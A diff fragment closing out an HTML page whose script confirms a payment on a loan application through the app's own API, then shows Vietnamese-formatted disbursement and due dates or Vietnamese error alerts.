+    const btn = document.querySelector('#screen-payment .btn-paid');
+    btn._origText = btn.textContent;
+    setLoading(btn, true);
+
+    try {
+      const res = await fetch(`${API_BASE}/api/applications/${currentAppId}/confirm-payment`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+      });
+      const json = await res.json();
+
+      if(!res.ok) {
+        alert('❌ ' + (json.message || 'Có lỗi xảy ra.'));
+        setLoading(btn, false);
+        return;
+      }
+
+      const data = json.data;
+      const fmt = s => s ? new Date(s).toLocaleDateString('vi-VN') : '--';
+
+      document.getElementById('disburse-date').textContent = fmt(data.disburseTime);
+      document.getElementById('due-date').textContent       = fmt(data.dueDate);
+
+      showScreen('screen-success');
+
+    } catch(err) {
+      console.error(err);
+      alert('❌ Không thể kết nối server. Vui lòng thử lại.');
+      setLoading(btn, false);
+    }
+  }
+</script>
+
+</body>
+</html>
